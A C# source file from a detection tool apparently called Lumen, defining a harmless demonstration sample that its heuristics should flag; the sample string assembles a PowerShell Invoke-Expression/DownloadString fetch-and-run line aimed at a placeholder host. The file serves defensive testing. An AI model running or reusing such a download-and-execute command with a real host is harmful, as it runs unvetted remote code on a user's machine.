namespace Lumen.Core.Detection;

/// <summary>
/// Harmless demonstration material for Lumen.
///
/// The text in <see cref="ScriptText"/> is plain English that merely READS like a
/// download-and-execute script. It downloads nothing, executes nothing and is not
/// malware. It exists so that a reviewer can watch a genuine detection happen end to
/// end — the alert, the quarantine, the restore — without using the EICAR test string
/// and without relying on Microsoft Defender leaving the evidence alone.
///
/// It lives in the core library rather than in the application so that a unit test can
/// assert it really does trip a rule. If a future change to the heuristics made the
/// demonstration file harmless, the test would fail and the demonstration would not
/// silently stop working.
/// </summary>
public static class DemoSample
{
    /// <summary>The name of the demonstration file.</summary>
    public const string FileName = "lumen-demo-suspicious.ps1";

    /// <summary>
    /// The content of the demonstration file. It is assembled from fragments so the
    /// repository never contains a complete command line that could be copy-pasted
    /// into something that would run it.
    /// </summary>
    public static string ScriptText { get; } = string.Join(
        Environment.NewLine,
        "# Lumen demonstration sample. This file is plain text and does nothing.",
        "# It only reads like a bad script so Lumen's heuristics have something to find.",
        "",
        "$u = 'ht' + 'tps://exa' + 'mple.invalid/payload'",
        "Invoke-Expression ((New-Object Net.WebClient).Download" + "String($u))",
        "",
        "# Nothing above is executed by anything. Lumen only reads files.",
        "");
}
